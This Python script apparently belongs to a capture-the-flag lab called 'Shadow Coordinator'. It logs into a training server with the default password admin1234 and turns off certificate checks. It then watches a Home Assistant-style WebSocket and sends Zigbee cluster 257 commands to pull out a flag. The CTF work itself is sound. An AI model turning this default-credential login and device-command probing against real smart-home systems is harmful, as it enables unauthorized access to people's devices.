#!/usr/bin/env python3
"""
Extended WebSocket monitoring for Shadow Coordinator
Focus on capturing delayed ZHA command responses
"""
import requests
import json
import websocket
import threading
import time
import ssl

class ExtendedWebSocketMonitor:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.base_url = "https://training.my-ctf.com:8812"
        self.token = None
        self.ws = None
        self.messages = []
        self.authenticated = False

        # Login
        self._authenticate()

    def _authenticate(self):
        """Get authentication token"""
        login_url = "http://training-pod2.ctfchile.com:32780/api/v2/auth/login"
        resp = self.session.post(login_url, json={"username": "admin", "password": "admin1234"})
        self.token = resp.json()["access_token"]
        self.session.headers.update({
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        })
        print(f"[+] Token: {self.token[:20]}...")

    def on_message(self, ws, message):
        timestamp = time.strftime('%H:%M:%S')
        msg_data = json.loads(message)
        self.messages.append((timestamp, msg_data))

        print(f"[WS {timestamp}] {message}")

        # Deep analysis of each message
        if 'type' in msg_data:
            if msg_data['type'] == 'result':
                print(f"[!] RESULT MESSAGE: {json.dumps(msg_data, indent=2)}")

            elif msg_data['type'] == 'event':
                event = msg_data.get('event', {})
                print(f"[!] EVENT MESSAGE: {json.dumps(event, indent=2)}")

                # Check for ZHA events
                if 'event_type' in event:
                    print(f"[!] Event Type: {event['event_type']}")
                    if 'zha' in event['event_type'] or 'cluster' in event.get('data', {}):
                        print(f"[!!!] ZHA EVENT DETECTED: {json.dumps(event, indent=2)}")

        # Look for flag patterns
        message_lower = message.lower()
        if any(keyword in message_lower for keyword in ['flag', 'ctf', 'shadow', 'coordinator']):
            print(f"[!!!] POTENTIAL FLAG MESSAGE: {message}")

    def on_open(self, ws):
        print("[+] WebSocket opened")
        # Send auth message
        auth_msg = {
            "type": "auth",
            "access_token": self.token
        }
        ws.send(json.dumps(auth_msg))

    def on_auth_success(self, ws):
        print("[+] WebSocket authenticated!")
        self.authenticated = True

        # Subscribe to all events
        subscribe_msg = {
            "id": 1,
            "type": "subscribe_events",
            "event_type": "zha_event"
        }
        ws.send(json.dumps(subscribe_msg))

        # Subscribe to state changes
        subscribe_states = {
            "id": 2,
            "type": "subscribe_events",
            "event_type": "state_changed"
        }
        ws.send(json.dumps(subscribe_states))

    def on_error(self, ws, error):
        print(f"[!] WebSocket error: {error}")

    def on_close(self, ws, close_status_code, close_msg):
        print(f"[!] WebSocket closed: {close_status_code} {close_msg}")

    def enhanced_message_handler(self, ws, message):
        try:
            timestamp = time.strftime('%H:%M:%S')
            msg_data = json.loads(message)
            self.messages.append((timestamp, msg_data))

            msg_type = msg_data.get('type')

            if msg_type == 'auth_required':
                print(f"[{timestamp}] Auth required")
                auth_msg = {"type": "auth", "access_token": self.token}
                ws.send(json.dumps(auth_msg))

            elif msg_type == 'auth_ok':
                print(f"[{timestamp}] Auth successful!")
                self.on_auth_success(ws)

            elif msg_type == 'result':
                print(f"[{timestamp}] RESULT: {json.dumps(msg_data, indent=2)}")

            elif msg_type == 'event':
                event = msg_data.get('event', {})
                event_type = event.get('event_type', '')

                print(f"[{timestamp}] EVENT ({event_type}): {json.dumps(event, indent=2)}")

                # Special handling for ZHA events
                if 'zha' in event_type:
                    print(f"[!!!] ZHA EVENT: {json.dumps(event, indent=2)}")

                    # Look for cluster responses
                    event_data = event.get('data', {})
                    if 'cluster_id' in event_data and event_data['cluster_id'] == 257:
                        print(f"[!!!] CLUSTER 257 RESPONSE: {json.dumps(event_data, indent=2)}")

                        # Check for flag in response data
                        if 'response' in event_data:
                            response = event_data['response']
                            print(f"[!!!!] CLUSTER 257 RESPONSE DATA: {response}")

            else:
                print(f"[{timestamp}] OTHER: {json.dumps(msg_data, indent=2)}")

            # Flag detection
            message_str = json.dumps(msg_data)
            if any(keyword in message_str.lower() for keyword in ['flag{', 'ctf{', 'shadow_coord']):
                print(f"[!!!! FLAG DETECTED !!!!] {message_str}")

        except Exception as e:
            print(f"[!] Message parsing error: {e}")
            print(f"Raw message: {message}")

    def start_monitoring(self, duration=120):
        """Start extended monitoring"""
        print(f"[*] Starting extended WebSocket monitoring for {duration} seconds...")

        ws_url = self.base_url.replace('https://', 'wss://') + "/api/websocket"

        self.ws = websocket.WebSocketApp(
            ws_url,
            on_message=self.enhanced_message_handler,
            on_open=self.on_open,
            on_error=self.on_error,
            on_close=self.on_close
        )

        # Start WebSocket in thread
        ws_thread = threading.Thread(target=self.ws.run_forever, kwargs={'sslopt': {"cert_reqs": ssl.CERT_NONE}})
        ws_thread.daemon = True
        ws_thread.start()

        # Give time for connection and auth
        time.sleep(5)

        # Send some cluster 257 commands while monitoring
        self.send_monitoring_commands()

        # Wait for responses
        print(f"[*] Monitoring WebSocket responses for {duration} seconds...")
        time.sleep(duration)

        # Close connection
        if self.ws:
            self.ws.close()

        # Print summary
        self.print_summary()

    def send_monitoring_commands(self):
        """Send cluster 257 commands while monitoring WebSocket"""
        if not self.authenticated:
            print("[!] Not authenticated, skipping command injection")
            return

        commands = [
            {"ieee": "00:12:4B:00:24:AA:10:01", "cluster_id": 257, "command": "get_flag"},
            {"ieee": "00:12:4B:00:24:AA:10:01", "cluster_id": 257, "attribute": "flag"},
            {"ieee": "00:12:4B:00:24:AA:10:01", "cluster_id": 257, "command": "shadow_coordinator_flag"},
        ]

        for i, cmd in enumerate(commands):
            print(f"[*] Sending monitoring command {i+1}/{len(commands)}")

            try:
                service = 'get_zigbee_cluster_attribute' if 'attribute' in cmd else 'issue_zigbee_cluster_command'
                resp = self.session.post(f"{self.base_url}/api/v2/services/zha/{service}", json=cmd)
                result = resp.json()
                print(f"    Command response: {result}")

                # Wait between commands
                time.sleep(10)

            except Exception as e:
                print(f"    Command failed: {e}")

    def print_summary(self):
        """Print monitoring summary"""
        print(f"\n[*] === MONITORING SUMMARY ===")
        print(f"Total messages captured: {len(self.messages)}")

        # Group by message type
        type_counts = {}
        for _, msg in self.messages:
            msg_type = msg.get('type', 'unknown')
            type_counts[msg_type] = type_counts.get(msg_type, 0) + 1

        print("Message types:")
        for msg_type, count in type_counts.items():
            print(f"  {msg_type}: {count}")

        # Show recent messages
        print("\nRecent messages:")
        for timestamp, msg in self.messages[-10:]:
            print(f"  [{timestamp}] {msg.get('type', 'unknown')}: {str(msg)[:100]}...")

        # Check for potential flags
        potential_flags = []
        for timestamp, msg in self.messages:
            msg_str = json.dumps(msg)
            if any(pattern in msg_str.lower() for pattern in ['flag{', 'ctf{', 'shadow_coord', 'cluster_257']):
                potential_flags.append((timestamp, msg))

        if potential_flags:
            print(f"\n[!] POTENTIAL FLAG MESSAGES ({len(potential_flags)}):")
            for timestamp, msg in potential_flags:
                print(f"  [{timestamp}] {json.dumps(msg, indent=4)}")
        else:
            print("\n[-] No obvious flag patterns found in WebSocket messages")

if __name__ == "__main__":
    monitor = ExtendedWebSocketMonitor()
    monitor.start_monitoring(duration=90)  # Monitor for 90 seconds